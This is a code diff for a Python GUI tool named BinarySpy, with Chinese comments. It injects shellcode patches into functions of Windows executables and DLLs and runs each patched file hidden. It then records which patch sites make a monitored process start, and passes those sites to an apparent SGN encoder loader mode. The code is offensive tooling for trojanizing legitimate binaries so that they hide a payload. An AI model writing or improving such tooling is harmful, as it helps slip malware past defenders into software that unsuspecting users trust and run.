+                    # B2：列表 spawn + 轮询 diff 检测 + 进程树整杀
+                    hit, new_procs = self._run_spawn_test(exe_to_run, delay, monitor_names)
+
+                    if hit:
+                        triggered = ", ".join(sorted(set(new_procs.values())))
                         self.log("log_hit", hex(addr))
+                        self.log(f"[!] 触发进程: {triggered}", detail_only=True)
                         hits.append((addr, name, depth, size))
                         self.log(f"[!!!] 命中! 地址={hex(addr)}, 函数={name}, 大小={size}, 深度={depth}", detail_only=True)
                     else:
                         self.log("log_fail")
                         # 删除测试失败的 fuzz 文件（如果启用）
-                        if self.auto_delete_var.get():
+                        if ui["auto_delete"]:
                             try:
                                 # DLL 模式删除整个测试目录
                                 if self.is_dll_target and os.path.exists(os.path.dirname(patched_file)):
@@ -1192,10 +1462,9 @@ class BinarySpy:
                                     self.log(f"[-] 已删除失败文件: {patched_file}", detail_only=True)
                             except Exception as del_e:
                                 self.log(f"[!] 删除失败: {str(del_e)}", detail_only=True)
-                    p.terminate()
                 except Exception as e:
                     self.log(f"[!] 执行错误: {str(e)}", detail_only=True)
-                    if self.auto_delete_var.get():
+                    if ui["auto_delete"]:
                         try:
                             if self.is_dll_target and os.path.exists(os.path.dirname(patched_file)):
                                 shutil.rmtree(os.path.dirname(patched_file))
@@ -1212,6 +1481,9 @@ class BinarySpy:
                 self.log("[+] 命中详情:")
                 for addr, name, depth, size in hits:
                     self.log(f"    depth={depth}, size={size} | {hex(addr)}: {name}")
+                # 供 SGN Loader 复用：这些函数已验证"会被调用且可安全切分"
+                self.fuzz_hits = {"target": target_path, "vas": [h[0] for h in hits]}
+                self.log("[+] 命中候选已记录：切到 SGN Loader 模式（VA 留空）即可复用")
             self.log(f"[*] 主日志文件: {log_file}")
             self.log(f"[*] 详细日志文件: {detail_log_file}")
             self.log("=" * 60)
@@ -1226,28 +1498,30 @@ class BinarySpy:
             self.root.after(0, lambda: self.stop_btn.config(state=tk.DISABLED))
             self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
 
-    def fuzz_all_worker_thread(self):
-        """全部 Fuzz 工作线程 - 直接测试所有大于补丁大小的函数"""
-        target_path = self.target_entry.get().strip()
-        patch_path = self.patch_entry.get().strip()
-        loader_path = self.loader_entry.get().strip()
-        
+    def fuzz_all_worker_thread(self, ui):
+        """全部 Fuzz 工作线程 - 直接测试所有大于补丁大小的函数
+        B1：输入全部来自主线程 UI 快照 ui"""
+        target_path = ui["target"]
+        patch_path = ui["patch"]
+        loader_path = ui["loader"]
+
         if not target_path:
             self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
             return
-        
+
         # DLL 模式需要 loader exe（除非填写了手动 VA）
         l = LANG_CONFIG[self.current_lang]
-        manual_va = self.va_entry.get().strip()
+        manual_va = ui["manual_va"]
         if self.is_dll_target and not loader_path and not manual_va:
-            messagebox.showwarning("警告" if self.current_lang == "zh" else "Warning",
-                                   l["need_loader"])
+            self._ui_messagebox("showwarning",
+                                "警告" if self.current_lang == "zh" else "Warning",
+                                l["need_loader"])
             self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
             return
 
         # 手动 VA 模式：直接测试指定地址
         if manual_va:
-            self._test_manual_va(target_path, patch_path, manual_va)
+            self._test_manual_va(ui)
             return
 
         log_file = None
@@ -1273,8 +1547,8 @@ class BinarySpy:
             self.log(f"[+] PE 加载成功: 架构={proj.arch.name}, 位宽={proj.arch.bits}, 入口点={hex(proj.entry)}", detail_only=True)
 
             # 获取补丁数据
-            if self.test_patched_var.get():
-                p_file = "calc64.bin" if proj.arch.bits == 64 else "calc32.bin"
+            if ui["test_patch"]:
+                p_file = "testfile/calc64.bin" if proj.arch.bits == 64 else "testfile/calc32.bin"
                 if not os.path.exists(p_file):
                     raise Exception(f"Missing {p_file}")
                 with open(p_file, 'rb') as f:
@@ -1285,9 +1559,9 @@ class BinarySpy:
                 self.log(f"[+] 补丁数据来源: {patch_path}, 大小={len(p_data)} bytes", detail_only=True)
 
             patch_size = len(p_data)
-            
+
             # 用户定义的最小函数大小优先，否则使用补丁大小
-            min_sz_input = self.size_entry.get().strip()
+            min_sz_input = ui["min_size"]
             min_sz = int(min_sz_input) if min_sz_input else patch_size
             self.log(f"[*] 最小函数大小过滤: {min_sz} bytes")
 
@@ -1408,36 +1682,31 @@ class BinarySpy:
                     continue
                 
                 self.log(f"[#{i+1}/{test_count}] Testing {name} @ {hex(addr)}")
-                
-                self.kill_calc_processes()
+
+                delay = float(ui["delay"] or "3.5")
+                monitor_names = self._monitor_names(ui["process"])
                 try:
-                    startupinfo = subprocess.STARTUPINFO()
-                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                    startupinfo.wShowWindow = subprocess.SW_HIDE
-                    
-                    # DLL 模式：复制 loader exe 到测试目录，然后运行
+                    # DLL 模式：复制 loader exe 到测试目录，测试加载器；EXE 模式直接测补丁文件
+                    exe_to_run = patched_file
                     if self.is_dll_target:
                         test_dir = os.path.dirname(patched_file)
                         loader_name = os.path.basename(loader_path)
                         test_loader = os.path.join(test_dir, loader_name)
-                        # 复制 loader 到测试目录
                         shutil.copy2(loader_path, test_loader)
-                        # 在测试目录中运行 loader
-                        p = subprocess.Popen(f'"{test_loader}"', shell=True, startupinfo=startupinfo,
-                                            creationflags=subprocess.CREATE_NO_WINDOW)
-                    else:
-                        p = subprocess.Popen(patched_file, shell=True, startupinfo=startupinfo,
-                                            creationflags=subprocess.CREATE_NO_WINDOW)
-                    
-                    delay = float(self.delay_entry.get().strip() or "3.5")
-                    time.sleep(delay)
-                    if self.kill_calc_processes():
+                        exe_to_run = test_loader
+
+                    # B2：列表 spawn + 轮询 diff 检测 + 进程树整杀
+                    hit, new_procs = self._run_spawn_test(exe_to_run, delay, monitor_names)
+
+                    if hit:
+                        triggered = ", ".join(sorted(set(new_procs.values())))
                         self.log("log_hit", hex(addr))
+                        self.log(f"[!] 触发进程: {triggered}", detail_only=True)
                         hits.append((addr, name, size))
                         self.log(f"[!!!] 命中! 地址={hex(addr)}, 函数={name}, 大小={size}", detail_only=True)
                     else:
                         self.log("log_fail")
-                        if self.auto_delete_var.get():
+                        if ui["auto_delete"]:
                             try:
                                 if self.is_dll_target and os.path.exists(os.path.dirname(patched_file)):
                                     shutil.rmtree(os.path.dirname(patched_file))
@@ -1447,10 +1716,9 @@ class BinarySpy:
                                     self.log(f"[-] 已删除失败文件: {patched_file}", detail_only=True)
                             except Exception as del_e:
                                 self.log(f"[!] 删除失败: {str(del_e)}", detail_only=True)
-                    p.terminate()
                 except Exception as e:
                     self.log(f"[!] 执行错误: {str(e)}", detail_only=True)
-                    if self.auto_delete_var.get():
+                    if ui["auto_delete"]:
                         try:
                             if self.is_dll_target and os.path.exists(os.path.dirname(patched_file)):
                                 shutil.rmtree(os.path.dirname(patched_file))
@@ -1468,6 +1736,9 @@ class BinarySpy:
                 self.log("[+] 命中详情:")
                 for addr, name, size in hits:
                     self.log(f"    size={size} | {hex(addr)}: {name}")
+                # 供 SGN Loader 复用：这些函数已验证"会被调用且可安全切分"
+                self.fuzz_hits = {"target": target_path, "vas": [h[0] for h in hits]}
+                self.log("[+] 命中候选已记录：切到 SGN Loader 模式（VA 留空）即可复用")
             self.log(f"[*] 主日志文件: {log_file}")
             self.log("=" * 60)
 
@@ -1514,11 +1785,30 @@ class BinarySpy:
                     offset = rva - s.VirtualAddress + s.PointerToRawData
                     section_name = s.Name.decode().strip('\x00')
                     break
-            
+
             if offset is None:
                 self.log(f"[!] 无法找到 VA {hex(va)} 对应的文件偏移", detail_only=True)
                 return None
-            
+
+            # --- B3 边界校验：拒绝越界/不可执行节补丁，避免写坏 PE ---
+            IMAGE_SCN_MEM_EXECUTE = 0x20000000
+            virt_end = s.VirtualAddress + s.Misc_VirtualSize
+            raw_end = s.PointerToRawData + s.SizeOfRawData
+            file_size = os.path.getsize(pe_path)
+            reasons = []
+            if not (s.Characteristics & IMAGE_SCN_MEM_EXECUTE):
+                reasons.append(f"目标 VA 所在节 [{section_name}] 不可执行")
+            if rva + len(data) > virt_end:
+                reasons.append(f"补丁越过节虚拟边界 (需 {len(data)}B, 节内剩余 {virt_end - rva}B)")
+            if offset + len(data) > raw_end:
+                reasons.append(f"补丁越过节原始数据边界 (offset+{len(data)} > raw_end {hex(raw_end)})")
+            if offset + len(data) > file_size:
+                reasons.append("补丁越过文件末尾")
+            if reasons:
+                self.log(f"[!] 补丁被拒绝 @ VA {hex(va)} [{section_name}]: " + "; ".join(reasons))
+                pe.close()
+                return None
+
             pe.close()
             
             # DLL 模式：使用原始文件名，放在测试子目录
